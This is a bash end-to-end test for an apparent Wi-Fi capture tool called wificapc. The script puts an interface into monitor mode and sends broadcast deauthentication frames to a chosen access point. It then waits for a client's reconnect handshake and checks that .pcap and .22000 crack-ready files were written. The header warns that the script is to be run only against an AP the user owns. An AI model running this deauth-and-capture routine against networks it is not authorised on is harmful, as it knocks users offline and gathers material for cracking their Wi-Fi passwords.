#!/usr/bin/env bash
# Active-attack end-to-end test. Requires root.
#
# Usage:
#   sudo IFACE=wlx00c0cab79cb7 BSSID=aa:bb:cc:dd:ee:ff CHANNEL=6 \
#        bash test/inject.sh
#
# What it does:
#   1. Brings up monitor, pins to CHANNEL
#   2. Starts recon
#   3. Waits ~2 s for the AP's beacon to populate the table
#   4. Sends 16 broadcast deauths via inject_deauth
#   5. Waits up to 30 s for a handshake.captured event from any STA
#      reconnecting to that AP after being kicked off
#   6. Verifies the .pcap and (if eviction completes) .22000 files exist
#
# **Only run this against an AP you own.** Sending deauth frames to networks
# you don't control is illegal in most jurisdictions.
set -euo pipefail

IFACE=${IFACE:-wlx00c0cab79cb7}
BSSID=${BSSID:?BSSID env var required: the MAC of your test AP}
CHANNEL=${CHANNEL:?CHANNEL env var required: the channel of your test AP}
WAIT_SECS=${WAIT_SECS:-30}
DEAUTH_COUNT=${DEAUTH_COUNT:-16}

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
REPO_DIR=$(cd "$SCRIPT_DIR/.." && pwd)
BIN=${BIN:-$REPO_DIR/wificapc}
SOCK=$(mktemp -u /tmp/wificapc.inj.XXXXXX.sock)
EVT=$(mktemp /tmp/wificapc.inj.events.XXXXXX)
HSDIR=$(mktemp -d /tmp/wificapc.inj.dir.XXXXXX)

if [[ $EUID -ne 0 ]]; then echo "must run as root" >&2; exit 2; fi
if [[ ! -x $BIN ]]; then echo "binary not built ($BIN)" >&2; exit 2; fi

cleanup() {
	[[ -n ${LISTEN:-} ]] && kill -TERM "$LISTEN" 2>/dev/null || true
	[[ -n ${PID:-}   ]] && kill -TERM "$PID"    2>/dev/null || true
	wait 2>/dev/null || true
	ip link set "$IFACE" down 2>/dev/null || true
	iw dev "$IFACE" set type managed 2>/dev/null || true
	ip link set "$IFACE" up 2>/dev/null || true
	rm -f "$SOCK" "$EVT"
	echo "captures preserved in: $HSDIR"
}
trap cleanup EXIT

"$BIN" --socket "$SOCK" --foreground &
PID=$!
for _ in {1..50}; do [[ -S $SOCK ]] && break; sleep 0.05; done
[[ -S $SOCK ]] || { echo "socket never appeared"; exit 1; }

(timeout $((WAIT_SECS + 10)) nc -U "$SOCK" >"$EVT") &
LISTEN=$!
sleep 0.2

run() { printf '%s\n' "$1" | nc -N -U "$SOCK"; }
assert() {
	local got=$1 want=$2 label=$3
	if [[ $got != *"$want"* ]]; then
		printf 'FAIL %s\n  got : %s\n  want: %s\n' "$label" "$got" "$want" >&2
		exit 1
	fi
	printf 'ok   %s\n' "$label"
}

resp=$(run "{\"id\":1,\"cmd\":\"iface_set\",\"args\":{\"name\":\"$IFACE\"}}")
assert "$resp" '"ok":true' "iface_set"

resp=$(run '{"id":2,"cmd":"monitor_on"}')
assert "$resp" '"ok":true' "monitor_on"

resp=$(run "{\"id\":3,\"cmd\":\"set_channel\",\"args\":{\"channel\":$CHANNEL}}")
assert "$resp" '"ok":true' "set_channel $CHANNEL"

resp=$(run "{\"id\":4,\"cmd\":\"set_handshake_dir\",\"args\":{\"path\":\"$HSDIR\"}}")
assert "$resp" '"ok":true' "set_handshake_dir"

resp=$(run '{"id":5,"cmd":"recon_start"}')
assert "$resp" '"ok":true' "recon_start"

echo "info dwelling on channel $CHANNEL for 2s to populate recon table..."
sleep 2

# Sanity: did we see beacons from the target?
resp=$(run '{"id":6,"cmd":"list_aps"}')
if [[ $resp != *"\"bssid\":\"$BSSID\""* ]]; then
	echo "WARN BSSID $BSSID not yet in recon table — sending deauth anyway"
fi

echo "info sending $DEAUTH_COUNT broadcast deauths to $BSSID..."
resp=$(run "{\"id\":10,\"cmd\":\"deauth\",\"args\":{\"bssid\":\"$BSSID\",\"count\":$DEAUTH_COUNT}}")
assert "$resp" '"ok":true' "deauth sent"
sent=$(printf '%s' "$resp" | sed -n 's/.*"sent":\([0-9]\+\).*/\1/p' | head -1)
echo "info sent=$sent of $DEAUTH_COUNT requested"
[[ ${sent:-0} -gt 0 ]] && echo "ok   inject sent at least one frame" || {
	echo "FAIL no frames sent — driver may not support TX from monitor mode"
	exit 1; }

# Some clients reconnect immediately; some need a couple of deauth bursts.
echo "info waiting up to ${WAIT_SECS}s for any reconnect handshake..."
deadline=$(( SECONDS + WAIT_SECS ))
got=""
while [[ $SECONDS -lt $deadline ]]; do
	if grep -q '"event":"handshake.captured"' "$EVT"; then got=1; break; fi
	sleep 1
done

run '{"id":99,"cmd":"recon_stop"}'  >/dev/null
run '{"id":100,"cmd":"monitor_off"}' >/dev/null
wait "$LISTEN" 2>/dev/null || true; LISTEN=

if [[ -z $got ]]; then
	echo "FAIL no handshake captured after deauth burst"
	echo "info try increasing DEAUTH_COUNT, or pick an AP with active clients"
	echo "--- events tail ---"
	tail -20 "$EVT"
	exit 1
fi
echo "ok   handshake.captured event arrived after deauth"

pcaps=( "$HSDIR"/*.pcap )
[[ -e ${pcaps[0]} ]] && echo "ok   pcap: ${pcaps[0]}" || {
	echo "FAIL no pcap files in $HSDIR"; exit 1; }

echo "all good"
